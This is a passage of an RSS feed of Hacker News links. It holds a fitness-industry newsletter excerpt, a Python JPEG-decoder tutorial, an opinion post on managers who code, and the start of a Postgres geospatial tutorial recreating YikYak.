<p><strong>Looking ahead:</strong>&nbsp;With anxiety and isolation at an&nbsp;<a href="https://insider.fitt.co/insider-newsletter-issue-82-ending-addiction/" target="_blank" rel="noopener">all-time high</a>, the need to confront the&nbsp;<a href="https://insider.fitt.co/wellness-startups-mental-health/" target="_blank" rel="noopener">mental health crisis</a>&nbsp;has never been greater. A bright spot amid the pandemic, digital behavioral health is&nbsp;<a href="https://insider.fitt.co/wellness-startups-stigma/" target="_blank" rel="noopener">destigmatizing</a>&nbsp;and expanding access to care.</p>
<p><strong>Related:</strong>&nbsp;<a href="https://insider.fitt.co/23-alex-katz-ceo-of-two-chairs/" target="_blank" rel="noopener">Two Chairs CEO Alex Katz</a>&nbsp;on the Fitt Insider podcast</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>🥊 Put ’em Up</h2>
          
          <p>Liteboxer, the latest&nbsp;<a href="https://us15.campaign-archive.com/?u=4c6bc12e271bc681951ed945a&amp;id=f14e6a628d" target="_blank" rel="noopener">Peloton of ‘X’</a>&nbsp;upstart, is taking aim at boxing within the booming connected fitness category.</p>
<p><strong>What it is:</strong>&nbsp;A competitor to FightCamp, an interactive at-home boxing experience, Liteboxer offers a free-standing, light-up punching bag for $1,495 and a $29/month content subscription.</p>
<p><strong>How it works:</strong>&nbsp;While FightCamp offers punch tracking technology and a variety of workouts from “real fighters”, Liteboxer looks a lot like Dance Dance Revolution for boxing. Flashing lights synced to music tell users where to hit and a force-tracking bag measures performance.</p>
<p><strong>Looking ahead:</strong>&nbsp;Following in Peloton’s footsteps is tempting, but surely at-home fitness has a ceiling — especially when every piece of equipment costs $1,500 or more.</p>
<p>For their part, Peloton appears to be rethinking the category a bit. The company was rumored to be working on a connected rower à la Hydrow. But recently, CFO Jill Woodworth&nbsp;<a href="https://outline.com/9fv3sB" target="_blank" rel="noopener">said</a>&nbsp;the company will forgo the rower, for now, in favor of a cheaper treadmill. Woodworth also said developing a product for the “boot camp category” is a priority. Is Peloton’s Mirror competitor in the works?</p>
<p><strong>Related:</strong>&nbsp;<a href="https://insider.fitt.co/7-khalil-zahar-co-founder-ceo-of-fightcamp/" target="_blank" rel="noopener">FightCamp CEO Khalil Zahar</a>&nbsp;on the Fitt Insider podcast</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>📰 News &amp; Notes</h2>
          
          <ul>
<li>The designification of&nbsp;<a href="https://www.metropolismag.com/interiors/healthcare-interiors/the-problem-with-the-designification-of-health-care/" target="_blank" rel="noopener">health</a>.</li>
<li>A&nbsp;<a href="https://twitter.com/joevennare/status/1278739336268308480?s=12" target="_blank" rel="noopener">thread</a>: Apple as a healthcare company</li>
<li>A 2015&nbsp;<a href="https://medium.com/@nickcrocker/how-to-lose-200m-pounds-why-myfitnesspal-works-d00f392d9783" target="_blank" rel="noopener">memo</a>: How MyFitnessPal works.</li>
<li>Meet&nbsp;<a href="https://highcourt.co/" target="_blank" rel="noopener">Highcourt</a>, NYC’s new wellness-focused “leisure club”.</li>
<li>Who are the best early-stage fitness and wellness&nbsp;…</li></ul></div></div></section></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://insider.fitt.co/issue-no-87-why-mirror-sold/">https://insider.fitt.co/issue-no-87-why-mirror-sold/</a></em></p>]]>
            </description>
            <link>https://insider.fitt.co/issue-no-87-why-mirror-sold/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23838564</guid>
            <pubDate>Tue, 14 Jul 2020 22:04:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding and writing a JPEG decoder in Python]]>
            </title>
            <description>
<![CDATA[
Score 243 | Comments 35 (<a href="https://news.ycombinator.com/item?id=23837838">thread link</a>) | @sfpoet
<br/>
July 14, 2020 | https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/ | <a href="https://web.archive.org/web/*/https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
			<span>
				<a target="_blank" href="https://github.com/yasoob/personal_blog/tree/master/content/posts/understanding-and-writing-jpeg-decoder-in-python.md">Source</a>
			</span>
			
				<p><img src="https://d33wubrfki0l68.cloudfront.net/797fe040e65dc288b7f22489dbad160e1e4998b8/0496b/images/decoding_jpeg/hero-image.png">
				</p>
			
			
			<span>
				
				<time itemprop="datePublished" datetime="2020-07-14">July 14, 2020</time>
				
			</span>
			<section itemprop="entry-text">
				

<p>Hi everyone! 👋 Today we are going to understand the JPEG compression algorithm. One thing a lot of people don’t know is that JPEG is not a format but rather an algorithm. The JPEG images you see are mostly in the JFIF format (JPEG File Interchange Format) that internally uses the JPEG compression algorithm. By the end of this article, you will have a much better understanding of how the JPEG algorithm compresses data and how you can write some custom Python code to decompress it. We will not be covering all the nuances of the JPEG format (like progressive scan) but rather only the basic baseline format while writing our decoder.</p>

<h2 id="introduction">Introduction</h2>

<p>Why write another article on JPEG when there are already hundreds of articles on the internet? Well, normally when you read articles on JPEG, the author just gives you details about what the format looks like. You don’t implement any code to do the actual decompression and decoding. Even if you do write code, it is in C/C++ and not accessible to a wide group of people. I plan on changing that by showing you how a basic JPEG decoder works using Python 3. I will be basing my decoder on <a href="https://github.com/aguaviva/micro-jpeg-visualizer/blob/master/micro-jpeg-visualizer.py">this</a> MIT licensed code but will be heavily modifying it for increased readability and ease of understanding. You can find the modified code for this article on my  <a href="https://github.com/yasoob/Baseline-JPEG-Decoder">GitHub repo</a>.</p>

<h2 id="different-parts-of-a-jpeg">Different parts of a JPEG</h2>

<p>Let’s start with this nice image by <a href="https://twitter.com/angealbertini">Ange Albertini</a>. It lists all different parts of a simple JPEG file. Take a look at it. We will be exploring each segment. You might have to refer to this image quite a few times while reading this tutorial.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/bdc1363abbd5744200ec5283d4154e55143df86c/8c624/images/decoding_jpeg/jpegrgb_dissected.png" alt="JPEGRGB_dissected.png"></p>

<p>At the very basic level, almost every binary file contains a couple of markers (or headers). You can think of these markers as sort of like bookmarks. They are very crucial for making sense of a file and are used by programs like <code>file</code> (on Mac/Linux) to tell us details about a file. These markers define where some specific information in a file is stored. Most of the markers are followed by <code>length</code> information for the particular marker segment. This tells us how long that particular segment is.</p>

<h3 id="file-start-file-end">File Start &amp; File End</h3>

<p>The very first marker we care about is <code>FF D8</code>. It tells us that this is the start of the image. If we don’t see it we can assume this is some other file. Another equally important marker is <code>FF D9</code>. It tells us that we have reached the end of an image file. Every marker, except for <code>FFD0</code> to <code>FFD9</code> and <code>FF01</code>, is immediately followed by a length specifier that will give you the length of that marker segment. As for the image file start and image file end markers, they will always be two bytes long each.</p>

<p>Throughout this tutorial, we will be working with this image:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7344493a5ee7126f8286dd83ade191cab9e7f292/fbea3/images/decoding_jpeg/profile.jpg" alt="Profile"></p>

<p>Let’s write some code to identify these markers.</p>

<pre><code>from struct import unpack


marker_mapping = {
    0xffd8: "Start of Image",
    0xffe0: "Application Default Header",
    0xffdb: "Quantization Table",
    0xffc0: "Start of Frame",
    0xffc4: "Define Huffman Table",
    0xffda: "Start of Scan",
    0xffd9: "End of Image"
}


class JPEG:
    def __init__(self, image_file):
        with open(image_file, 'rb') as f:
            self.img_data = f.read()
    
    def decode(self):
        data = self.img_data
        while(True):
            marker, = unpack("&gt;H", data[0:2])
            print(marker_mapping.get(marker))
            if marker == 0xffd8:
                data = data[2:]
            elif marker == 0xffd9:
                return
            elif marker == 0xffda:
                data = data[-2:]
            else:
                lenchunk, = unpack("&gt;H", data[2:4])
                data = data[2+lenchunk:]            
            if len(data)==0:
                break        

if __name__ == "__main__":
    img = JPEG('profile.jpg')
    img.decode()    

# OUTPUT:
# Start of Image
# Application Default Header
# Quantization Table
# Quantization Table
# Start of Frame
# Huffman Table
# Huffman Table
# Huffman Table
# Huffman Table
# Start of Scan
# End of Image
</code></pre>

<p>We are using <a href="https://docs.python.org/3/library/struct.html">struct</a> to unpack the bytes of image data. <code>&gt;H</code> tells <code>struct</code> to treat the data as big-endian and of type <code>unsigned short</code>. The data in JPEG is stored in big-endian format. Only the EXIF data <em>can</em> be in little-endian (even though it is uncommon). And a short is of size 2 so we provide <code>unpack</code> two bytes from our <code>img_data</code>. You might ask yourself how we knew it was a <code>short</code>. Well, we know that the markers in JPEG are 4 hex digits: <code>ffd8</code>. One hex digit equals 4 bits (<sup>1</sup>⁄<sub>2</sub> byte) so 4 hex digits will equal 2 bytes and a short is equal to 2 bytes.</p>

<p>The Start of Scan section is immediately followed by image scan data and that image scan data doesn’t have a length specified. It continues till the “end of file” marker is found so for now we are manually “seeking” to the EOF marker whenever we see the SOC marker.</p>

<p>Now that we have the basic framework in place, let’s move on and figure out what the rest of the image data contains. We will go through some necessary theory first and then get down to coding.</p>

<h2 id="encoding-a-jpeg">Encoding a JPEG</h2>

<p>I will first explain some basic concepts and encoding techniques used by JPEG and then decoding will naturally follow from that as a reverse of it. In my experience, directly trying to make sense of decoding is a bit hard.</p>

<p>Even though the image below won’t mean much to you right now, it will give you some anchors to hold on to while we go through the whole encoding/decoding process. It shows the steps involved in the JPEG encoding process: (<a href="https://users.cs.cf.ac.uk/Dave.Marshall/Multimedia/node234.html">src</a>)</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7237dd0093b6a8070b2c927673fd73bc797561d2/33b0a/images/decoding_jpeg/encoding.png" alt="JPEG Encoding process"></p>

<h3 id="jpeg-color-space">JPEG Color Space</h3>

<p>According to the JPEG spec (<a href="http://www.itu.int/rec/T-REC-T.872-201206-I/en">ISO/IEC 10918-6:2013 (E)</a>, section 6.1):</p>

<blockquote>
<ul>
<li>Images encoded with only one component are assumed to be grayscale data in which 0 is black and 255 is white.</li>
<li>Images encoded with three components are assumed to be RGB data encoded as YCbCr unless the image contains an APP14 marker segment as specified in 6.5.3, in which case the color encoding is considered either RGB or YCbCr according to the application data of the APP14 marker segment. The relationship between RGB and YCbCr is defined as specified in Rec. ITU-T T.871 | ISO/IEC 10918-5.</li>
<li>Images encoded with four components are assumed to be <strong>CMYK</strong>, with (0,0,0,0) indicating white unless the image contains an APP14 marker segment as specified in 6.5.3, in which case the color encoding is considered either <strong>CMYK</strong> or <strong>YCCK</strong> according to the application data of the APP14 marker segment. The relationship between <strong>CMYK</strong> and <strong>YCCK</strong> is defined as specified in clause 7.</li>
</ul>
</blockquote>

<p>Most JPEG algorithm implementations use luminance and chrominance (YUV encoding) instead of RGB. This is super useful in JPEG as the human eye is pretty bad at seeing high-frequency brightness changes over a small area so we can essentially reduce the amount of frequency and the human eye won’t be able to tell the difference. Result? A highly compressed image with almost no visible reduction in quality.</p>

<p>Just like each pixel in RGB color space is made up of 3 bytes of color data (Red, Green, Blue), each pixel in YUV uses 3 bytes as well but what each byte represents is slightly different. The Y component determines the brightness of the color (also referred to as luminance or luma), while the U  and V components determine the color (also known as chroma). The U component refers to the amount of blue color and the V component refers to the amount of red color.</p>

<p>This color format was invented when color televisions weren’t super common and engineers wanted to use one image encoding format for both color and black and white televisions. YUV could be safely displayed on a black and white TV if color wasn’t available. You can read more about its history on <a href="https://www.wikiwand.com/en/YUV">Wikipedia</a>.</p>

<h3 id="discrete-cosine-transform-quantization">Discrete Cosine Transform &amp; Quantization</h3>

<p>JPEG converts an image into chunks of 8x8 blocks of pixels (called MCUs or Minimum Coding Units), changes the range of values of the pixels so that they center on 0 and then applies Discrete Cosine Transformation to each block and then uses quantization to compress the resulting block. Let’s get a high-level understanding of what all of these terms mean.</p>

<p>A Discrete Cosine Transform is a method for converting discrete data points into a combination of cosine waves. It seems pretty useless to spend time converting an image into a bunch of cosines but it makes sense once we understand DCT in combination with how the next step works. In JPEG, DCT will take an 8x8 image block and tell us how to reproduce it using an 8x8 matrix of cosine functions.  <a href="https://www.impulseadventure.com/photo/jpeg-minimum-coded-unit.html">Read more here</a>)</p>

<p>The 8x8 matrix of cosine functions look like this:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/97f11adca54888172fc19cef52e514ef0e8b46fd/1a72e/images/decoding_jpeg/cosine-funcs.png" alt="Cosine functions"></p>

<p>We apply DCT to each component of a pixel separately. The output of applying DCT is an 8x8 coefficient matrix that tells us how much each cosine function (out of 64 total functions) contributes to the 8x8 input matrix. The coefficient matrix of a DCT generally contains bigger values in the top left corner of the coefficient matrix and smaller values in the bottom right corner. The top left corner represents the lowest frequency cosine function and the bottom right represents the highest frequency cosine function.</p>

<p>What this tells us is that most images contain a huge amount of low-frequency information and a small amount of high-frequency information. If we turn the bottom right components of each DCT matrix to 0, the resulting image would still appear the same because, as I mentioned, humans are bad at observing high-frequency changes. This is exactly what we do in the next step.</p>

<p>I found a wonderful video on this topic. Watch it if DCT doesn’t make too much sense.</p>

<iframe width="560" height="326" src="https://www.youtube.com/embed/Q2aEzeMDHMA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>We have all heard that JPEG is a lossy compression algorithm but so far we haven’t done anything lossy. We have only transformed 8x8 blocks of YUV components into 8x8 blocks of cosine functions with no loss of information. The lossy part comes in the quantization step.</p>

<p>Quantization is a process in which we take a couple of values in a specific range and turns them into a discrete value. For our case, this is just a fancy name for converting the higher …</p></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/">https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/</a></em></p>]]>
            </description>
            <link>https://yasoob.me/posts/understanding-and-writing-jpeg-decoder-in-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837838</guid>
            <pubDate>Tue, 14 Jul 2020 21:03:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Manager Can’t Code? They Shouldn’t Be Your Manager]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 57 (<a href="https://news.ycombinator.com/item?id=23837614">thread link</a>) | @lanecwagner
<br/>
July 14, 2020 | https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Managers who can’t code are an outdated artifact of corporate America circa 2005. The best managers that I’ve had spend ~80% of their time coding, architecting, or doing technical work that requires engineering prowess. If your manager thinks coding is “beneath” them then they need a dose of humble pie. Your organization would likely be better off without them.</p>



<h2><span id="But_Managers_Manage_People">But Managers Manage <em>People</em>!</span>
</h2>



<p>There is a long-running stigma associated with developers, that we are all geeks who can’t handle interpersonal relationships. Due to our code monkey nature, we need “people people” who can go to meetings for us and communicate our efforts effectively to the higher-ups.</p>



<div><figure><img src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" alt="introverted programmers are an outdated meme" srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" sizes="(max-width: 700px) 100vw, 700px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" data-src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>



<p>While the above is still funny, it’s <em>outdated</em>. As the developer community has grown exponentially in the last 20 years, so too has the personality diversity amongst its members. In other words, it is<strong> not hard to find developers with the soft-skills </strong>necessary for management positions.</p>



<h2><span id="Managers_Should_Help">Managers Should Help</span>
</h2>



<p>I am a firm believer in the following:</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" alt="" srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" data-src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><p>While the manager doesn’t need to be the most talented developer on the team, they must at least be technically literate. When a team member goes to their boss with a technical proposal, the manager should be able to give valuable feedback.</p>



<p>In this <a href="https://hbr.org/2016/12/if-your-boss-could-do-your-job-youre-more-likely-to-be-happy-at-work">study from Harvard</a> 35,000 employees from the US and Great Britain were polled about their job satisfaction, and metrics were gathered about what influenced their happiness at work. The results showed that the <em>single greatest influencing factor </em>on employee satisfaction was whether or not their boss was technically competent. I practice what I preach, so at the <a href="https://classroom.qvault.io/">Qvault app,</a> all engineering leadership will forever be responsible for pushing code.</p>



<p>Contrast the idea of a competent boss with the all-too-familiar experience of going to a <a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">non-technical middle-management type</a> with an engineering problem, only to be stuck in a teaching session because the boss has never heard of a pub-sub system.</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/9e3a6f35f44188bad76c100f3560ce69.gif" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><h2><span id="Managers_Need_Empathy">Managers Need Empathy</span>
</h2>



<p>A good manager has empathy for those who report to them. If the boss doesn’t code or hasn’t written code in a long time, they won’t understand the daily problems that their team is faced with. A good engineering leader will not only understand modern problems, but they make it their role to actively seek technical solutions in an ever-changing innovative landscape.</p>



<h2><span id="INB4_So_the_CEO_needs_to_be_able_to_code">INB4: “So the CEO needs to be able to code?”</span>
</h2>



<p>No, but the CTO does!</p>



<p>I am sympathetic to the idea that the CTO will have plenty of business and product-related work to focus on, but they can’t let their technical chops slip. In order to run the engineering arm of an innovative company, the person at the top should have a firm mental grasp on the implementation difficulties. If this just means reviewing architectural diagrams and reviewing pull-requests so be it, but nothing beats hands-on engineering work to stay sharp.</p>



<h2><span id="Feedback_Please">Feedback Please</span>
</h2>



<p>Have you had problems with non-technical leaders, or do you disagree completely with my opinions? Let me know through one of my <a href="https://qvault.io/contact/">social profiles</a>.</p>



<div><div>
<h2><span id="Thanks_For_Reading">Thanks For Reading</span>
</h2>



<p>Follow us on Twitter <a href="https://twitter.com/q_vault">@q_vault</a> if you have any questions or comments</p>



<p>Take game-like coding courses on <a href="https://classroom.qvault.io/#/">Qvault Classroom</a></p>



<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe">Subscribe</a> to our Newsletter for more educational articles</p>
</div></div>



<h2><span id="Related_Articles">Related Articles:</span>
</h2>



<ul><li><a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">Leave Scrum to Rugby, I Like Getting Stuff Done</a></li></ul>



		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/07/14/your-manager-cant-code-they-shouldnt-be-your-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837614</guid>
            <pubDate>Tue, 14 Jul 2020 20:46:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recreating YikYak with Postgres]]>
            </title>
            <description>
<![CDATA[
Score 81 | Comments 23 (<a href="https://news.ycombinator.com/item?id=23837269">thread link</a>) | @AJRF
<br/>
July 14, 2020 | https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/ | <a href="https://web.archive.org/web/*/https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Yik_Yak" target="_blank">YikYak</a> was an anonymous social network that used your location to show you posts 5km around you.  Users of the app could create new posts and the people around them could view the posts and vote up or down.</p>



<p>YikYak filed a few patents for the tech that helped them achieve this. The patents mention segmenting users into buckets by their physical location. One modern tool we have to recreate this type of user segmentation is a data-structure called an <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/R*_tree" target="_blank">R-Tree</a>. </p>



<figure><img data-attachment-id="154" data-permalink="https://adamfallon.com/1rsz300nanspcxrd2bu5sqw/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=2000%2C873&amp;ssl=1" data-orig-size="2000,873" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1rsz300nanspcxrd2bu5sqw" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=300%2C131&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?fit=580%2C253&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/1rsz300nanspcxrd2bu5sqw.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>An example on an R-Tree in action</em></figcaption></figure>



<p>R-trees&nbsp;are&nbsp;tree data structures&nbsp;used for&nbsp;spatial access methods, i.e., for indexing multi-dimensional information such as&nbsp;<strong>geographical coordinates</strong>,&nbsp;rectangles&nbsp;or&nbsp;polygons.</p>



<p>Luckily the Postgres database enables us to make use of this data-structure via geospatial extensions. In this post I am going to;</p>



<ol><li>Show how we can enable those extensions.</li><li>Seed a few posts into our database.</li><li>Find the posts in a small around a specific latitude and longitude using a SQL query.</li></ol>



<p>Let’s get started!</p>



<hr>



<h2>Creating tables.</h2>



<p>Firstly you will need an instance of Postgres. It is easy to set up in Docker (I’ve detailed a post <a rel="noreferrer noopener" href="https://adamfallon.com/2020/07/08/postgres-in-docker/" target="_blank">here</a> showing how). </p>



<p>I am going to be using DBeaver for this tutorial but you could use psql or any other Postgres connector. Let’s creating a new table for our posts.</p>



<div><figure><img data-attachment-id="207" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-32-15/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=2560%2C296&amp;ssl=1" data-orig-size="2560,296" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.32.15" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=300%2C35&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?fit=580%2C67&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.15-e1594370249361.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Select the SQL Editor</em></figcaption></figure></div>



<div><figure><img data-attachment-id="209" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-32-36/" data-orig-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=829%2C339&amp;ssl=1" data-orig-size="829,339" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.32.36" data-image-description="" data-medium-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=300%2C123&amp;ssl=1" data-large-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?fit=580%2C237&amp;ssl=1" src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.32.36-e1594370225286.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Chose whatever Database you want. I am going with Postgres</em></figcaption></figure></div>



<div><figure><img data-attachment-id="210" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-33-04/" data-orig-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=1090%2C682&amp;ssl=1" data-orig-size="1090,682" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.33.04" data-image-description="" data-medium-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=300%2C188&amp;ssl=1" data-large-file="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?fit=580%2C363&amp;ssl=1" src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.33.04.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption><em>Name your script</em></figcaption></figure></div>



<p>Ready to go – So below we have a simple example of table for storing new posts. I am using a split latitude and longitude to show how the extensions work, but you could also combine the two into a POINT datatype if you are planning to use a lot of columns.</p>



<pre>CREATE TABLE post (
	id int8 NOT NULL GENERATED ALWAYS AS IDENTITY,
	post_content text NOT NULL,
	latitude float8 NOT NULL,
	longitude float8 NOT NULL
);</pre>



<p>On executing that you should have a table you can start insert values into. </p>



<h2>Inserting posts.</h2>



<p>So let’s start out by inserting two posts, the first posted from 10 Downing Street, and the second from Buckingham Palace.</p>



<pre>INSERT INTO post VALUES (
	default,
	'I absolutely love the Queen. I hope she thinks I am doing a good job.',
	51.5034,
	0.1276
);
INSERT INTO post VALUES (
	default,
	'The new Prime Minister is a prat! I do hope he doesnt come over often',
	51.5014,
	0.1419
);</pre>



<p>Now let’s put another post in from an aspiring politics student who is located in Cambridge University (65 miles away). Now we have an outlier that won’t show up once we do location bound queries later in this tutorial.</p>



<pre>INSERT INTO post VALUES (
	default,
	'Day one of my politics degree. Shall be most fun to stalk the halls of Westminister in 4 years.',
	52.2053,
	0.1218
